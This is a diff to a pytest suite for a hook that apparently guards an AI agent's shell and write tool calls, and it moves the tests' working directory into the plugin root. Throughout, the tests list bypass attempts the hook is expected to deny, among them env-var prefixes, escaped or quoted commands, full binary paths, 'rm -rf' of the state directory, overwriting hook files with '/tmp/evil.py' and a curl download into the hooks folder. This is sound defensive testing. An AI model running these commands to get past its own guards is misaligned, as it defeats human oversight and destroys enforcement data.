@@ -5,11 +5,20 @@ These tests verify the new daemon command blocking and retained write guards.
 """
 from __future__ import annotations
 
+import os
+
 import pytest
 
 from hook_runner import run_hook
 
 HOOK = "enforcement/hooks/_sahjhan_bootstrap.py"
+
+# Use the plugin root as the default test cwd so bootstrap's PROTECTED-path
+# checks (enforcement/, hooks/hooks.json, bin/sahjhan…) stay active during
+# these bypass-detection tests. PROTECTED is plugin-relative, so the guard
+# only engages when cwd is inside the plugin — the realistic "agent working
+# on the plugin itself" scenario the tests are written to exercise.
+REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 
 
 def _run_hook(event: dict) -> dict:
@@ -26,7 +35,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan reset --confirm"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -37,7 +46,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan reset --confirm --proof abc123"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -47,7 +56,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan frobnicate --all"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -57,7 +66,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -67,7 +76,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan --config-dir /some/path status"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -77,7 +86,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan daemon stop"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -87,7 +96,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan daemon start"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -97,7 +106,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan gate check converge"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -107,7 +116,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan defer low PL-005"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -117,7 +126,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan init"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -127,7 +136,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "nohup sahjhan daemon start > /dev/null 2>&1 &"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -137,7 +146,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "echo foo && sahjhan reset --confirm"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -147,7 +156,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "Sahjhan Reset --confirm"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -157,7 +166,7 @@ class TestSahjhanAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "git status"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -165,7 +174,13 @@ class TestSahjhanAllowlist:
 
 @pytest.mark.hook_e2e
 class TestReadNoLongerGuarded:
-    """With daemon vault, file reads are no longer blocked."""
+    """With daemon vault, file reads are no longer blocked.
+
+    These cases use /tmp/fake-cwd so the cwd-relative path resolves outside
+    the plugin root. PROTECTED enforcement is plugin-scoped; a Read from an
+    unrelated cwd naming ``enforcement/…`` refers to the target project's
+    own enforcement directory, not the plugin's.
+    """
 
     def test_read_quiz_bank_allowed(self):
         """quiz-bank.json is no longer read-guarded (data lives in vault)."""
@@ -216,7 +231,7 @@ class TestWriteGuardsRetained:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sed -i 's/old/new/g' enforcement/events.toml"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -225,7 +240,7 @@ class TestWriteGuardsRetained:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": 'echo "hacked" > docs/holtz/STATUS.md'},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -381,7 +396,7 @@ class TestHelpFlagAllowed:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan --help"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow", (
@@ -393,7 +408,7 @@ class TestHelpFlagAllowed:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan -h"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -403,7 +418,7 @@ class TestHelpFlagAllowed:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan init --help"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -413,7 +428,7 @@ class TestHelpFlagAllowed:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan --config-dir /some/path --help"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -428,7 +443,7 @@ class TestRedirectFragmentHandling:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan status 2>&1"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow", (
@@ -441,7 +456,7 @@ class TestRedirectFragmentHandling:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan init 2>&1"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -451,7 +466,7 @@ class TestRedirectFragmentHandling:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan status 2>/dev/null"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -461,7 +476,7 @@ class TestRedirectFragmentHandling:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan transition run_start 2>&1"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -471,7 +486,7 @@ class TestRedirectFragmentHandling:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "sahjhan reset --confirm 2>&1"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -494,7 +509,7 @@ class TestEnvVarPrefixBypassesAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "FOO=bar sahjhan reset --confirm"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -507,7 +522,7 @@ class TestEnvVarPrefixBypassesAllowlist:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "A=1 B=2 sahjhan reset --confirm"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -529,7 +544,7 @@ class TestEnvVarPrefixBypassesWriteProtection:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "X=1 rm -rf docs/holtz/.sahjhan/"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -541,7 +556,7 @@ class TestEnvVarPrefixBypassesWriteProtection:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "X=1 cp /tmp/evil enforcement/hooks/foo.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -553,7 +568,7 @@ class TestEnvVarPrefixBypassesWriteProtection:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "X=1 sed -i 's/old/new/' enforcement/events.toml"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -565,7 +580,7 @@ class TestEnvVarPrefixBypassesWriteProtection:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": 'X=1 echo "hacked" > docs/holtz/STATUS.md'},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -623,7 +638,7 @@ class TestManagedDataWriteProtection:
         event = {
             "tool_name": "Write",
             "tool_input": {"file_path": "docs/holtz/some-notes.md"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -638,7 +653,7 @@ class TestCopyMoveTargetDirectoryBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "cp -t enforcement/hooks/ /tmp/evil.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -648,7 +663,7 @@ class TestCopyMoveTargetDirectoryBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "mv -t enforcement/hooks/ /tmp/evil.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -658,7 +673,7 @@ class TestCopyMoveTargetDirectoryBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "cp --target-directory=enforcement/ /tmp/evil.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -668,7 +683,7 @@ class TestCopyMoveTargetDirectoryBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "mv --target-directory enforcement/ /tmp/evil.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -683,7 +698,7 @@ class TestFullPathCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "/bin/cp /tmp/evil.py enforcement/hooks/foo.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -693,7 +708,7 @@ class TestFullPathCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "/usr/bin/mv /tmp/evil.py enforcement/hooks/foo.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -703,7 +718,7 @@ class TestFullPathCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "/bin/rm -rf docs/holtz/.sahjhan/"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -713,7 +728,7 @@ class TestFullPathCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "/usr/bin/rmdir docs/holtz/.sahjhan/"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -723,7 +738,7 @@ class TestFullPathCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "/bin/cp file.txt /tmp/safe.txt"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -743,7 +758,7 @@ class TestQuotedPathBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": 'cp /tmp/evil "enforcement/hooks/foo.py"'},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -753,7 +768,7 @@ class TestQuotedPathBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "cp /tmp/evil 'enforcement/hooks/foo.py'"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -763,7 +778,7 @@ class TestQuotedPathBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": 'echo pwned > "docs/holtz/STATUS.md"'},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -773,7 +788,7 @@ class TestQuotedPathBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": 'rm -rf "docs/holtz/.sahjhan/"'},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -783,7 +798,7 @@ class TestQuotedPathBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": 'echo pwned | tee "docs/holtz/STATUS.md"'},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -795,7 +810,7 @@ class TestQuotedPathBypass:
             "tool_input": {
                 "command": 'FOO="bar baz" python3 -c "open(\'enforcement/hooks/x\',\'w\')"',
             },
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -815,7 +830,7 @@ class TestBackslashEscapedCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "\\cp /tmp/evil enforcement/hooks/foo.py"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -826,7 +841,7 @@ class TestBackslashEscapedCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "\\rm -rf docs/holtz/.sahjhan"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -837,7 +852,7 @@ class TestBackslashEscapedCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": '"cp" /tmp/evil enforcement/hooks/foo.py'},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -848,7 +863,7 @@ class TestBackslashEscapedCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "'rm' -rf docs/holtz/.sahjhan"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -861,7 +876,7 @@ class TestBackslashEscapedCommandBypass:
             "tool_input": {
                 "command": "\\python3 -c \"open('enforcement/hooks/x','w')\"",
             },
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -874,7 +889,7 @@ class TestBackslashEscapedCommandBypass:
             "tool_input": {
                 "command": "\\curl -o enforcement/hooks/foo.py https://example.com/x",
             },
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -886,7 +901,7 @@ class TestBackslashEscapedCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "\\cp file.txt /tmp/safe.txt"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
@@ -896,7 +911,7 @@ class TestBackslashEscapedCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "\\sahjhan reset --confirm"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
@@ -908,7 +923,7 @@ class TestBackslashEscapedCommandBypass:
         event = {
             "tool_name": "Bash",
             "tool_input": {"command": "'sahjhan' daemon stop"},
-            "cwd": "/tmp/fake-cwd",
+            "cwd": REPO_ROOT,
         }
         output = _run_hook(event)
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny", (
